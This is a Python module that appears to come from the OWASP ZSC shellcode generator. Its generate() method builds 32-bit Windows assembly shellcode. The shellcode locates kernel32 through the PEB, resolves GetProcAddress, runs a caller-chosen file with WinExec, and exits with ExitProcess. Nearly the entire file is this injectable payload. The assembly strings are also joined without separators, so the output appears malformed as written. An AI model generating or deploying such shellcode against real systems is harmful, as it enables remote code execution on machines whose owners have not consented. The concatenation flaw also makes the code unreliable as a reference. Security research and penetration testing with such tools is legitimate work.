
"""
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.cores import stack
from math import ceil
from owasp_zsc.new_cores import base_module


class Module(base_module.BaseModule):
    file_dest = base_module.OptString("", "File dest")  # TODO improve descr

    def generate(self):
        payload = "xor    %ecx,%ecx"
        payload += "mov    %fs:0x30(%ecx),%eax"
        payload += "mov    0xc(%eax),%eax"
        payload += "mov    0x14(%eax),%esi"
        payload += "lods   %ds:(%esi),%eax"
        payload += "xchg   %eax,%esi"
        payload += "lods   %ds:(%esi),%eax"
        payload += "mov    0x10(%eax),%ebx"
        payload += "mov    0x3c(%ebx),%edx"
        payload += "add    %ebx,%edx"
        payload += "mov    0x78(%edx),%edx"
        payload += "add    %ebx,%edx"
        payload += "mov    0x20(%edx),%esi"
        payload += "add    %ebx,%esi"
        payload += "xor    %ecx,%ecx"
        payload += "inc    %ecx"
        payload += "lods   %ds:(%esi),%eax"
        payload += "add    %ebx,%eax"
        payload += "cmpl   $0x50746547,(%eax)"
        payload += "jne    23 <.text+0x23>"
        payload += "cmpl   $0x41636f72,0x4(%eax)"
        payload += "jne    23 <.text+0x23>"
        payload += "cmpl   $0x65726464,0x8(%eax)"
        payload += "jne    23 <.text+0x23>"
        payload += "mov    0x24(%edx),%esi"
        payload += "add    %ebx,%esi"
        payload += "mov    (%esi,%ecx,2),%cx"
        payload += "dec    %ecx"
        payload += "mov    0x1c(%edx),%esi"
        payload += "add    %ebx,%esi"
        payload += "mov    (%esi,%ecx,4),%edx"
        payload += "add    %ebx,%edx"
        payload += "push   %ebx"
        payload += "push   %edx"
        payload += "xor    %ecx,%ecx"
        payload += "push   %ecx"
        payload += "mov    $0x61636578,%ecx"
        payload += "push   %ecx"
        payload += "subl   $0x61,0x3(%esp)"
        payload += "push   $0x456e6957"
        payload += "push   %esp"
        payload += "push   %ebx"
        payload += "call   *%edx"
        payload += "add    $0x8,%esp"
        payload += "pop    %ecx"
        payload += "push   %eax"
        payload += "xor    %ecx,%ecx"
        payload += "push   %ecx"
        payload += stack.generate(self.file_dest, "%ecx", "string")
        payload += "xor    %ebx,%ebx"
        payload += "mov    %esp,%ebx"
        payload += "xor    %ecx,%ecx"
        payload += "inc    %ecx"
        payload += "push   %ecx"
        payload += "push   %ebx"
        payload += "call   *%eax"
        payload += f"add    ${hex(int(8 + 4 * (ceil(len(self.file_dest) / float(4)))))},%esp"
        payload += "pop    %edx"
        payload += "pop    %ebx"
        payload += "xor    %ecx,%ecx"
        payload += "mov    $0x61737365,%ecx"
        payload += "push   %ecx"
        payload += "subl   $0x61,0x3(%esp)"
        payload += "push   $0x636f7250"
        payload += "push   $0x74697845"
        payload += "push   %esp"
        payload += "push   %ebx"
        payload += "call   *%edx"
        payload += "xor    %ecx,%ecx"
        payload += "push   %ecx"
        payload += "call   *%eax"

        return payload
